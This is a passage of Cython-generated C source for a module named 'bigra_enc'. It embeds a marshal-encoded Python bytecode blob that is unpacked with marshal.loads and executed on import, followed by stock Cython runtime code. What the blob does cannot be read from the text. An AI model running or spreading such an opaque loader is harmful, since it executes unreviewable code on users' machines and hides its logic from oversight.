!\x88\x01\xd8\n\r\x88\x01\xd8\n\x1a\x88&\xd7\n\x1a\xd1\n\x1a\x984\xa0\x04\xd3\n%\x88\x01\xd8\n\x1a\x88&\xd7\n\x1a\xd1\n\x1a\x982\x98c\xd3\n"\x88\x01\xd8\n \x88\x01\xd8\x15\x17\x90D\x98\x01\x98!\x98\x13\x98B\x98q\x98c\xa0!\xa0\x13\xa0Q\xa0C\xa8\x01\xa0s\xa8"\xa8Q\xa8C\xb0\x01\xa8s\xb0!\xb0A\xb03\xb0a\xb8\x01\xb0s\xb8!\xb8A\xb83\xb8a\xc0\x01\xb8s\xd0\x12C\x88\x08\xd8\x08\x0c\x8f\x0b\x89\x0b\x90H\xd5\x08\x1d\xf0\x1d\x00\x0e\x19\xf0 \x00\x06t\x01\x80\x04\xf2\x02\x00\x0bG,\x80\x07\xd8\t\x0b\x80\x06\xd8\x12)\x90*\xd7\x12)\xd1\x12)\xd0*L\xd0SW\xd4\x12X\xd7\x12_\xd1\x12_\xd0`g\xd3\x12h\xd7\x12p\xd1\x12p\xd0qu\xd0vx\xd3\x12y\x80\x0f\xd8\x08\x1f\x88\n\xd7\x08\x1f\xd1\x08\x1f\xd0 :\xc0\x14\xd4\x08F\xd7\x08M\xd1\x08M\xc8g\xd3\x08V\xd7\x08^\xd1\x08^\xd0_c\xd0df\xd3\x08g\x80\x05\xd8\x08\x1f\x88\n\xd7\x08\x1f\xd1\x08\x1f\xd0 5\xb8D\xd4\x08A\xd7\x08H\xd1\x08H\xc8\x17\xd3\x08Q\xd7\x08Y\xd1\x08Y\xd0Z^\xd0_a\xd3\x08b\x80\x05\xd8\x07\x0e\x80\x04\xf0\x02\x03\x01\x18\xd8\x0f&\x88z\xd7\x0f&\xd1\x0f&\xd0\'C\xc8$\xd4\x0fO\xd7\x0fV\xd1\x0fV\xd0W^\xd3\x0f_\xd7\x0fe\xd1\x0fe\xd0fi\xd3\x0fj\xd0kl\xd1\x0fm\xd7\x0fu\xd1\x0fu\xd0vz\xd0{}\xd3\x0f~\x88\x04\xf0\x06\x00\x08\x1f\x80z\xd7\x07\x1e\xd1\x07\x1e\xd0\x1f@\xc0t\xd4\x07L\xd7\x07S\xd1\x07S\xd0T[\xd3\x07\\\xd7\x07d\xd1\x07d\xd0ei\xd0jl\xd3\x07m\x80\x04\xd8\x07\x1e\x80z\xd7\x07\x1e\xd1\x07\x1e\xd0\x1f9\xc0\x04\xd4\x07E\xd7\x07L\xd1\x07L\xc8W\xd3\x07U\xd7\x07]\xd1\x07]\xd0^b\xd0ce\xd3\x07f\x80\x04\xd8\x07\x0c\x80\x04\xd8\x07\x16\x80\x04\xd8\x07\x1e\x80z\xd7\x07\x1e\xd1\x07\x1e\xd0\x1f?\xc0d\xd4\x07K\xd7\x07R\xd1\x07R\xd0SZ\xd3\x07[\xd7\x07c\xd1\x07c\xd0dg\xd0hk\xd3\x07l\xd7\x07t\xd1\x07t\xd0uy\xd0z|\xd3\x07}\x80\x04\xd8\x07\x1e\xd0\x1f6\x98z\xd7\x1f6\xd1\x1f6\xd07`\xd0gk\xd4\x1fl\xd7\x1fs\xd1\x1fs\xd0t{\xd3\x1f|\xf7\x00\x00 E\x02\xf1\x00\x00 E\x02\xf0\x00\x00F\x02J\x02\xf0\x00\x00K\x02M\x02\xf3\x00\x00 N\x02\xf1\x00\x00\x08N\x02\xf0\x00\x00O\x02X\x02\xf1\x00\x00\x08X\x02\xf0\x00\x00Y\x02p\x02\xf0\x00\x00Y\x02c\x02\xf7\x00\x00Y\x02p\x02\xf1\x00\x00Y\x02p\x02\xf0\x00\x00q\x02Y\x03\xf0\x00\x00`\x03d\x03\xf4\x00\x00Y\x02e\x03\xf7\x00\x00Y\x02l\x03\xf1\x00\x00Y\x02l\x03\xf0\x00\x00m\x03t\x03\xf3\x00\x00Y\x02u\x03\xf7\x00\x00Y\x02}\x03\xf1\x00\x00Y\x02}\x03\xf0\x00\x00~\x03B\x04\xf0\x00\x00C\x04E\x04\xf3\x00\x00Y\x02F\x04\xf1\x00\x00\x08F\x04\x80\x04\xf0\x02\x14\x01\x18\xd8\x0f&\x88z\xd7\x0f&\xd1\x0f&\xd0\'C\xc8$\xd4\x0fO\xd7\x0fV\xd1\x0fV\xd0W^\xd3\x0f_\xd7\x0fe\xd1\x0fe\xd0fi\xd3\x0fj\x88\x04\xd8\x10\x11\x88\x05\xdb\x11\x15\x88A\xd8\x10\x15\x90q\x91\x08\x91\x05\xf0\x03\x00\x12\x16\xe0\x11\x1a\x88\x06\xd8\x0b\x11\x90S\x8a=\xd8\x17.\x90z\xd7\x17.\xd1\x17.\xd0/K\xd0RV\xd4\x17W\xd7\x17^\xd1\x17^\xd0_f\xd3\x17g\xd7\x17m\xd1\x17m\xd0nq\xd3\x17r\xd0st\xd1\x17u\xd7\x17}\xd1\x17}\xf0\x00\x00\x7f\x01C\x02\xf0\x00\x00D\x02F\x02\xf3\x00\x00\x18G\x02\x90\x04\xdc\x10\x16\x98\x04\x91\x0c\x91\x06\xd8\r\x13\x90s\x8a]\xf0\x02\x05\x11%\xd8\x1f6\x98z\xd7\x1f6\xd1\x1f6\xd07S\xd0Z^\xd4\x1f_\xd7\x1ff\xd1\x1ff\xd0gn\xd3\x1fo\xd7\x1fu\xd1\x1fu\xd0vy\xd3\x1fz\xd0{|\xd1\x1f}\xf7\x00\x00 F\x02\xf1\x00\x00 F\x02\xf0\x00\x00G\x02K\x02\xf0\x00\x00L\x02N\x02\xf3\x00\x00 O\x02\x98\x04\xdc\x18\x1e\xa0\x04\x99\x0c\x99\x06\xf0\n\x00\x18 \x90\x04\xdc\x10\x16\x98\x04\x91\x0c\x90\x06\xf0\x08\x00\x1b*\xd8\x10\x15\xd8\x10\x15\xd8\x0f\x13\xd8\x0f\x13\xd8\x0f\x13\xd8\x0f\x14\xd8\x0f\x13\xd8\x0f\x13\xd8\x0f\x13\xf1\x15\n\n\x15\x80\x06\xf2\x16\x02\x01\x10\xf0\x06\x0c\x07?\x80\x04\xf2\x1e\x01\x01U\x01\xf0\x06\x00\x06\x07\x80\x04\xd8\x04\x06\x80\x03\xd8\x04\x06\x80\x03\xd8\x04\x06\x80\x03\xd8\x03\x05\x80\x02\xf2\x06\x1d\x01\x10\xf2@\x01G\x01\x01\x17\xf2P\x02L\x02\x01\x15\xf2Z\x04L\x02\x01\x15\xf2Z\x04$\x01\r\xf2J\x01#\x01\x14\xf1H\x01\x00\x01\n\x85\x0b\xf8\xf0C\x12\x00\x08\x1b\xf2\x00\x03\x01\x08\xd9\x01\x06\xd0\x07/\xd4\x010\xd8\x01\n\x80\x12\x87\x19\x81\x19\xd0\x0bF\xd4\x01G\xd9\x01\x05\x87\x16\xf0\x07\x03\x01\x08\xfb\xf0d\x01\x01\x01\x18\xd8\x0f\x17\x8b\x04\xfb\xf0(\x00\x18!\xf2\x00\x02\x11%\xd8\x1f\'\x98\x04\xdc\x18\x1e\xa0\x04\x99\x0c\x9d\x06\xfb\xf0\x05\x02\x11%\xfb\xf0\x0c\x01\x01\x18\xd8\x0f\x17\x8a\x04\xfasV\x00\x00\x00\xb8/R*\x00\xc8\x1bA\x05S\x17\x00\xcd;B\x1bS>\x00\xd0\x17A\x0eS!\x00\xd1%\x0cS>\x00\xd2*&S\x14\x03\xd3\x13\x01S\x14\x03\xd3\x17\x04S\x1e\x03\xd3!\x05S;\x03\xd3&\x0bS6\x03\xd31\x05S>\x00\xd36\x05S;\x03\xd3;\x03S>\x00\xd3>\x04T\x04\x03'))             # <<<<<<<<<<<<<<
*/
  __pyx_t_3 = NULL;
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_marshal); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_loads); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_6 = 1;
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_3, __pyx_mstate_global->__pyx_kp_b_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d_l_Z};
    __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
  }
  __pyx_t_5 = __Pyx_PyExecGlobals(__pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  /* "bigra_enc.py":1
 * #ENCODED By : SHONA ARAIN             # <<<<<<<<<<<<<<
 * #ENCRYPTION : PY3 MARSHAL
 * 
*/
  __pyx_t_5 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_test, __pyx_t_5) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  if (__pyx_m) {
    if (__pyx_mstate->__pyx_d && stringtab_initialized) {
      __Pyx_AddTraceback("init bigra_enc", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    #if !CYTHON_USE_MODULE_STATE
    Py_CLEAR(__pyx_m);
    #else
    Py_DECREF(__pyx_m);
    if (pystate_addmodule_run) {
      PyObject *tp, *value, *tb;
      PyErr_Fetch(&tp, &value, &tb);
      PyState_RemoveModule(&__pyx_moduledef);
      PyErr_Restore(tp, value, tb);
    }
    #endif
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init bigra_enc");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #else
  return __pyx_m;
  #endif
}
/* #### Code section: pystring_table ### */

typedef struct {
    const char *s;
#if 107559 <= 65535
    const unsigned short n;
#elif 107559 / 2 < INT_MAX
    const unsigned int n;
#elif 107559 / 2 < LONG_MAX
    const unsigned long n;
#else
    const Py_ssize_t n;
#endif
#if 1 <= 31
    const unsigned int encoding : 5;
#elif 1 <= 255
    const unsigned char encoding;
#elif 1 <= 65535
    const unsigned short encoding;
#else
    const Py_ssize_t encoding;
#endif
    const unsigned int is_unicode : 1;
    const unsigned int intern : 1;
} __Pyx_StringTabEntry;
static const char * const __pyx_string_tab_encodings[] = { 0 };
static const __Pyx_StringTabEntry __pyx_string_tab[] = {
  {__pyx_k_, sizeof(__pyx_k_), 0, 1, 0}, /* PyObject cname: __pyx_kp_u_ */
  {__pyx_k_builtins, sizeof(__pyx_k_builtins), 0, 1, 1}, /* PyObject cname: __pyx_n_u_builtins */
  {__pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 1, 1}, /* PyObject cname: __pyx_n_u_cline_in_traceback */
  {__pyx_k_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d_l_Z, sizeof(__pyx_k_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d_l_Z), 0, 0, 0}, /* PyObject cname: __pyx_kp_b_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d_l_Z */
  {__pyx_k_initializing, sizeof(__pyx_k_initializing), 0, 1, 1}, /* PyObject cname: __pyx_n_u_initializing */
  {__pyx_k_loads, sizeof(__pyx_k_loads), 0, 1, 1}, /* PyObject cname: __pyx_n_u_loads */
  {__pyx_k_main, sizeof(__pyx_k_main), 0, 1, 1}, /* PyObject cname: __pyx_n_u_main */
  {__pyx_k_marshal, sizeof(__pyx_k_marshal), 0, 1, 1}, /* PyObject cname: __pyx_n_u_marshal */
  {__pyx_k_module, sizeof(__pyx_k_module), 0, 1, 1}, /* PyObject cname: __pyx_n_u_module */
  {__pyx_k_name, sizeof(__pyx_k_name), 0, 1, 1}, /* PyObject cname: __pyx_n_u_name */
  {__pyx_k_qualname, sizeof(__pyx_k_qualname), 0, 1, 1}, /* PyObject cname: __pyx_n_u_qualname */
  {__pyx_k_spec, sizeof(__pyx_k_spec), 0, 1, 1}, /* PyObject cname: __pyx_n_u_spec */
  {__pyx_k_test, sizeof(__pyx_k_test), 0, 1, 1}, /* PyObject cname: __pyx_n_u_test */
  {0, 0, 0, 0, 0}
};
/* InitStrings.proto */
static int __Pyx_InitStrings(__Pyx_StringTabEntry const *t, PyObject **target, const char* const* encoding_names);

/* #### Code section: cached_builtins ### */

static int __Pyx_InitCachedBuiltins(__pyx_mstatetype *__pyx_mstate) {
  CYTHON_UNUSED_VAR(__pyx_mstate);
  return 0;
}
/* #### Code section: cached_constants ### */

static int __Pyx_InitCachedConstants(__pyx_mstatetype *__pyx_mstate) {
  __Pyx_RefNannyDeclarations
  CYTHON_UNUSED_VAR(__pyx_mstate);
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);
  __Pyx_RefNannyFinishContext();
  return 0;
}
/* #### Code section: init_constants ### */

static int __Pyx_InitConstants(__pyx_mstatetype *__pyx_mstate) {
  CYTHON_UNUSED_VAR(__pyx_mstate);
  if (__Pyx_InitStrings(__pyx_string_tab, __pyx_mstate->__pyx_string_tab, __pyx_string_tab_encodings) < 0) __PYX_ERR(0, 1, __pyx_L1_error);
  return 0;
  __pyx_L1_error:;
  return -1;
}
/* #### Code section: init_codeobjects ### */

static int __Pyx_CreateCodeObjects(__pyx_mstatetype *__pyx_mstate) {
  CYTHON_UNUSED_VAR(__pyx_mstate);
  return 0;
}
/* #### Code section: init_globals ### */

static int __Pyx_InitGlobals(void) {
  /* PythonCompatibility.init */
  if (likely(__Pyx_init_co_variables() == 0)); else

if (unlikely(PyErr_Occurred())) __PYX_ERR(0, 1, __pyx_L1_error)

  return 0;
  __pyx_L1_error:;
  return -1;
}
/* #### Code section: cleanup_globals ### */
/* #### Code section: cleanup_module ### */
/* #### Code section: main_method ### */
/* #### Code section: utility_code_pragmas ### */
#ifdef _MSC_VER
#pragma warning( push )
/* Warning 4127: conditional expression is constant
 * Cython uses constant conditional expressions to allow in inline functions to be optimized at
 * compile-time, so this warning is not useful
 */
#pragma warning( disable : 4127 )
#endif



/* #### Code section: utility_code_def ### */

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *module = 0;
    PyObject *empty_dict = 0;
    PyObject *empty_list = 0;
    empty_dict = PyDict_New();
    if (unlikely(!empty_dict))
        goto bad;
    if (level == -1) {
        if (strchr(__Pyx_MODULE_NAME, '.') != (0)) {
            module = PyImport_ImportModuleLevelObject(
                name, __pyx_mstate_global->__pyx_d, empty_dict, from_list, 1);
            if (unlikely(!module)) {
                if (unlikely(!PyErr_ExceptionMatches(PyExc_ImportError)))
                    goto bad;
                PyErr_Clear();
            }
        }
        level = 0;
    }
    if (!module) {
        module = PyImport_ImportModuleLevelObject(
            name, __pyx_mstate_global->__pyx_d, empty_dict, from_list, level);
    }
bad:
    Py_XDECREF(empty_dict);
    Py_XDECREF(empty_list);
    return module;
}

/* ImportDottedModule */
static PyObject *__Pyx__ImportDottedModule_Error(PyObject *name, PyObject *parts_tuple, Py_ssize_t count) {
    PyObject *partial_name = NULL, *slice = NULL, *sep = NULL;
    Py_ssize_t size;
    if (unlikely(PyErr_Occurred())) {
        PyErr_Clear();
    }
#if CYTHON_ASSUME_SAFE_SIZE
    size = PyTuple_GET_SIZE(parts_tuple);
#else
    size = PyTuple_Size(parts_tuple);
    if (size < 0) goto bad;
#endif
    if (likely(size == count)) {
        partial_name = name;
    } else {
        slice = PySequence_GetSlice(parts_tuple, 0, count);
        if (unlikely(!slice))
            goto bad;
        sep = PyUnicode_FromStringAndSize(".", 1);
        if (unlikely(!sep))
            goto bad;
        partial_name = PyUnicode_Join(sep, slice);
    }
    PyErr_Format(
        PyExc_ModuleNotFoundError,
        "No module named '%U'", partial_name);
bad:
    Py_XDECREF(sep);
    Py_XDECREF(slice);
    Py_XDECREF(partial_name);
    return NULL;
}
static PyObject *__Pyx__ImportDottedModule_Lookup(PyObject *name) {
    PyObject *imported_module;
#if (CYTHON_COMPILING_IN_PYPY && PYPY_VERSION_NUM  < 0x07030400) ||\
        CYTHON_COMPILING_IN_GRAAL
    PyObject *modules = PyImport_GetModuleDict();
    if (unlikely(!modules))
        return NULL;
    imported_module = __Pyx_PyDict_GetItemStr(modules, name);
    Py_XINCREF(imported_module);
#else
    imported_module = PyImport_GetModule(name);
#endif
    return imported_module;
}
static PyObject *__Pyx_ImportDottedModule_WalkParts(PyObject *module, PyObject *name, PyObject *parts_tuple) {
    Py_ssize_t i, nparts;
#if CYTHON_ASSUME_SAFE_SIZE
    nparts = PyTuple_GET_SIZE(parts_tuple);
#else
    nparts = PyTuple_Size(parts_tuple);
    if (nparts < 0) return NULL;
#endif
    for (i=1; i < nparts && module; i++) {
        PyObject *part, *submodule;
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        part = PyTuple_GET_ITEM(parts_tuple, i);
#else
        part = __Pyx_PySequence_ITEM(parts_tuple, i);
        if (!part) return NULL;
#endif
        submodule = __Pyx_PyObject_GetAttrStrNoError(module, part);
#if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)
        Py_DECREF(part);
#endif
        Py_DECREF(module);
        module = submodule;
    }
    if (unlikely(!module)) {
        return __Pyx__ImportDottedModule_Error(name, parts_tuple, i);
    }
    return module;
}
static PyObject *__Pyx__ImportDottedModule(PyObject *name, PyObject *parts_tuple) {
    PyObject *imported_module;
    PyObject *module = __Pyx_Import(name, NULL, 0);
    if (!parts_tuple || unlikely(!module))
        return module;
    imported_module = __Pyx__ImportDottedModule_Lookup(name);
    if (likely(imported_module)) {
        Py_DECREF(module);
        return imported_module;
    }
    PyErr_Clear();
    return __Pyx_ImportDottedModule_WalkParts(module, name, parts_tuple);
}
static PyObject *__Pyx_ImportDottedModule(PyObject *name, PyObject *parts_tuple) {
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject *module = __Pyx__ImportDottedModule_Lookup(name);
    if (likely(module)) {
        PyObject *spec = __Pyx_PyObject_GetAttrStrNoError(module, __pyx_mstate_global->__pyx_n_u_spec);
        if (likely(spec)) {
            PyObject *unsafe = __Pyx_PyObject_GetAttrStrNoError(spec, __pyx_mstate_global->__pyx_n_u_initializing);
            if (likely(!unsafe || !__Pyx_PyObject_IsTrue(unsafe))) {
                Py_DECREF(spec);
                spec = NULL;
            }
            Py_XDECREF(unsafe);
        }
        if (likely(!spec)) {
            PyErr_Clear();
            return module;
        }
        Py_DECREF(spec);
        Py_DECREF(module);
    } else if (PyErr_Occurred()) {
        PyErr_Clear();
    }
#endif
    return __Pyx__ImportDottedModule(name, parts_tuple);
}

/* PyExec */
static CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject* o, PyObject* globals) {
    return __Pyx_PyExec3(o, globals, NULL);
}
static PyObject* __Pyx_PyExec3(PyObject* o, PyObject* globals, PyObject* locals) {
    PyObject* result;
#if !CYTHON_COMPILING_IN_LIMITED_API
    PyObject* s = 0;
    char *code = 0;
#endif
    if (!globals || globals == Py_None) {
        globals = __pyx_mstate_global->__pyx_d;
    }
#if !CYTHON_COMPILING_IN_LIMITED_API
    else if (unlikely(!PyDict_Check(globals))) {
        __Pyx_TypeName globals_type_name =
            __Pyx_PyType_GetFullyQualifiedName(Py_TYPE(globals));
        PyErr_Format(PyExc_TypeError,
                     "exec() arg 2 must be a dict, not " __Pyx_FMT_TYPENAME,
                     globals_type_name);
        __Pyx_DECREF_TypeName(globals_type_name);
        goto bad;
    }
#endif
    if (!locals || locals == Py_None) {
        locals = globals;
    }
#if !CYTHON_COMPILING_IN_LIMITED_API
    if (__Pyx_PyDict_GetItemStr(globals, __pyx_mstate_global->__pyx_n_u_builtins) == NULL) {
        if (unlikely(PyDict_SetItem(globals, __pyx_mstate_global->__pyx_n_u_builtins, PyEval_GetBuiltins()) < 0))
            goto bad;
    }
    if (PyCode_Check(o)) {
        if (unlikely(__Pyx_PyCode_HasFreeVars((PyCodeObject *)o))) {
            PyErr_SetString(PyExc_TypeError,
                "code object passed to exec() may not contain free variables");
            goto bad;
        }
        #if CYTHON_COMPILING_IN_PYPY && PYPY_VERSION_NUM < 0x07030400
        result = PyEval_EvalCode((PyCodeObject *)o, globals, locals);
        #else
        result = PyEval_EvalCode(o, globals, locals);
        #endif
    } else {
        PyCompilerFlags cf;
        cf.cf_flags = 0;
#if PY_VERSION_HEX >= 0x030800A3
        cf.cf_feature_version = PY_MINOR_VERSION;
#endif
        if (PyUnicode_Check(o)) {
            cf.cf_flags = PyCF_SOURCE_IS_UTF8;
            s = PyUnicode_AsUTF8String(o);
            if (unlikely(!s)) goto bad;
            o = s;
        } else if (unlikely(!PyBytes_Check(o))) {
            __Pyx_TypeName o_type_name = __Pyx_PyType_GetFullyQualifiedName(Py_TYPE(o));
            PyErr_Format(PyExc_TypeError,
                "exec: arg 1 must be string, bytes or code object, got " __Pyx_FMT_TYPENAME,
                o_type_name);
            __Pyx_DECREF_TypeName(o_type_name);
            goto bad;
        }
        code = PyBytes_AS_STRING(o);
        if (PyEval_MergeCompilerFlags(&cf)) {
            result = PyRun_StringFlags(code, Py_file_input, globals, locals, &cf);
        } else {
            result = PyRun_String(code, Py_file_input, globals, locals);
        }
        Py_XDECREF(s);
    }
    return result;
bad:
    Py_XDECREF(s);
    return 0;
#else // CYTHON_COMPILING_IN_LIMITED_API
    {
        PyObject *builtins, *exec, *exec_str;
        builtins = PyEval_GetBuiltins();
        if (!builtins) return NULL;
        exec_str = PyUnicode_FromStringAndSize("exec", 4);
        if (!exec_str) return NULL;
        exec = PyObject_GetItem(builtins, exec_str);
        Py_DECREF(exec_str);
        if (!exec) return NULL;
        result = PyObject_CallFunctionObjArgs(exec, o, globals, locals, NULL);
        Py_DECREF(exec);
        return result;
    }
#endif
}

/* PyExecGlobals */
static PyObject* __Pyx_PyExecGlobals(PyObject* code) {
    return __Pyx_PyExec2(code, __pyx_mstate_global->__pyx_d);
}

/* PyErrExceptionMatches */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx_PyErr_ExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    n = PyTuple_GET_SIZE(tuple);
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
    for (i=0; i<n; i++) {
        if (__Pyx_PyErr_GivenExceptionMatches(exc_type, PyTuple_GET_ITEM(tuple, i))) return 1;
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err) {
    int result;
    PyObject *exc_type;
#if PY_VERSION_HEX >= 0x030C00A6
    PyObject *current_exception = tstate->current_exception;
    if (unlikely(!current_exception)) return 0;
    exc_type = (PyObject*) Py_TYPE(current_exception);
    if (exc_type == err) return 1;
#else
    exc_type = tstate->curexc_type;
    if (exc_type == err) return 1;
    if (unlikely(!exc_type)) return 0;
#endif
    #if CYTHON_AVOID_BORROWED_REFS
    Py_INCREF(exc_type);
    #endif
    if (unlikely(PyTuple_Check(err))) {
        result = __Pyx_PyErr_ExceptionMatchesTuple(exc_type, err);
    } else {
        result = __Pyx_PyErr_GivenExceptionMatches(exc_type, err);
    }
    #if CYTHON_AVOID_BORROWED_REFS
    Py_DECREF(exc_type);
    #endif
    return result;
}
#endif

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
#if PY_VERSION_HEX >= 0x030C00A6
    PyObject *tmp_value;
    assert(type == NULL || (value != NULL && type == (PyObject*) Py_TYPE(value)));
    if (value) {
        #if CYTHON_COMPILING_IN_CPYTHON
        if (unlikely(((PyBaseExceptionObject*) value)->traceback != tb))
        #endif
            PyException_SetTraceback(value, tb);
    }
    tmp_value = tstate->current_exception;
    tstate->current_exception = value;
    Py_XDECREF(tmp_value);
    Py_XDECREF(type);
    Py_XDECREF(tb);
#else
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
#endif
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
#if PY_VERSION_HEX >= 0x030C00A6
    PyObject* exc_value;
    exc_value = tstate->current_exception;
    tstate->current_exception = 0;
    *value = exc_value;
    *type = NULL;
    *tb = NULL;
    if (exc_value) {
        *type = (PyObject*) Py_TYPE(exc_value);
        Py_INCREF(*type);
        #if CYTHON_COMPILING_IN_CPYTHON
        *tb = ((PyBaseExceptionObject*) exc_value)->traceback;
        Py_XINCREF(*tb);
        #else
        *tb = PyException_GetTraceback(exc_value);
        #endif
    }
#else
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
#endif
}
#endif

/* PyObjectGetAttrStrNoError */
#if __PYX_LIMITED_VERSION_HEX < 0x030d0000
static void __Pyx_PyObject_GetAttrStr_ClearAttributeError(void) {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    if (likely(__Pyx_PyErr_ExceptionMatches(PyExc_AttributeError)))
        __Pyx_PyErr_Clear();
}
#endif
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStrNoError(PyObject* obj, PyObject* attr_name) {
    PyObject *result;
#if __PYX_LIMITED_VERSION_HEX >= 0x030d0000
    (void) PyObject_GetOptionalAttr(obj, attr_name, &result);
    return result;
#else
#if CYTHON_COMPILING_IN_CPYTHON && CYTHON_USE_TYPE_SLOTS
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro == PyObject_GenericGetAttr)) {
        return _PyObject_GenericGetAttrWithDict(obj, attr_name, NULL, 1);
    }
#endif
    result = __Pyx_PyObject_GetAttrStr(obj, attr_name);
    if (unlikely(!result)) {
        __Pyx_PyObject_GetAttrStr_ClearAttributeError();
    }
    return result;
#endif
}

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStrNoError(__pyx_mstate_global->__pyx_b, name);
    if (unlikely(!result) && !PyErr_Occurred()) {
        PyErr_Format(PyExc_NameError,
            "name '%U' is not defined", name);
    }
    return result;
}

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
